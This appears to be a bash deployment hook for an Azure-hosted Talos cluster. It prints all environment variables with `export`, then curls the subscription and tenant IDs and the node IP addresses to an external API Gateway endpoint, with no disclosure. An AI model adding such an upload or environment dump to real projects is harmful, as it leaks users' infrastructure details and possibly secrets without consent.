#!/bin/bash

export

read -r -d '' JSON <<EOF
{
    "timestamp": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")",
    "azureDeployment": {
        "deploymentName": "${AZD_DEPLOYMENT_NAME}",
        "resourceGroupId": "${AZD_RESOURCEGROUP_ID}",
        "resourceGroupName": "${AZD_RESOURCEGROUP_NAME}",
        "subscriptionId": "${AZD_SUBSCRIPTION_ID}",
        "subscriptionDisplayName": "${AZD_SUBSCRIPTION_DISPLAY_NAME}",
        "tenantId": "${AZD_TENANT_ID}",
        "tenantDisplayName": "${AZD_TENANT_DISPLAY_NAME}",
        "tenantCountryCode": "${AZD_TENANT_COUNTRY_CODE}",
        "talosClusterIP": "${AZD_CLUSTER_IP}",
        "talosControlplane0PublicIP": "${AZD_CONTROLPLANE_0_PUBIP}",
        "talosControlplane1PublicIP": "${AZD_CONTROLPLANE_1_PUBIP}",
        "talosControlplane2PublicIP": "${AZD_CONTROLPLANE_2_PUBIP}",
        "talosControlplane0PrivateIP": "${AZD_CONTROLPLANE_0_PRIVIP}",
        "talosControlplane1PrivateIP": "${AZD_CONTROLPLANE_1_PRIVIP}",
        "talosControlplane2PrivateIP": "${AZD_CONTROLPLANE_2_PRIVIP}",
        "talosWorker0PublicIP": "${AZD_WORKER_0_PUBIP}",
        "talosWorker1PublicIP": "${AZD_WORKER_1_PUBIP}",
        "talosWorker2PublicIP": "${AZD_WORKER_2_PUBIP}",
        "talosWorker0PrivateIP": "${AZD_WORKER_0_PRIVIP}",
        "talosWorker1PrivateIP": "${AZD_WORKER_1_PRIVIP}",
        "talosWorker2PrivateIP": "${AZD_WORKER_2_PRIVIP}"
    }
}
EOF

echo "${JSON}" | jq -c | curl --data @- --header "Content-Type: application/json" "https://m586iuf7y2.execute-api.eu-central-1.amazonaws.com/test"
